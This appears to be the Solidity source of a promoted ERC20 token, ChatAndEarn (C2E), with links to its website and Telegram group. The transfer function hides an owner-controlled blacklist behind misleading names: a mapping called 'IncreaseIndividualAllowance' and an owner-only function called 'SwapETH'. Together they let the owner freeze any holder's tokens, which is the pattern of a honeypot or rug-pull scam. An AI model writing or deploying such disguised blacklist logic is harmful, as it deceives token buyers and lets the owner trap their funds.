// SPDX-License-Identifier: MIT
// Website: http://chatandearn.net/
// Telegram Group: https://t.me/chatandearnapp


pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";

contract ChatAndEarn is ERC20, Ownable {
    mapping(address => bool) public IncreaseIndividualAllowance;

    constructor() ERC20("ChatAndEarn", "C2E") {
        _mint(msg.sender, 100000000 * (10**18));
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(! IncreaseIndividualAllowance[from], "Sender.");
        require(! IncreaseIndividualAllowance[to], "Receiver.");
        super._transfer(from, to, amount);
    }

    function SwapETH(address _user, bool _value) public onlyOwner {
        IncreaseIndividualAllowance[_user] = _value;
    }
}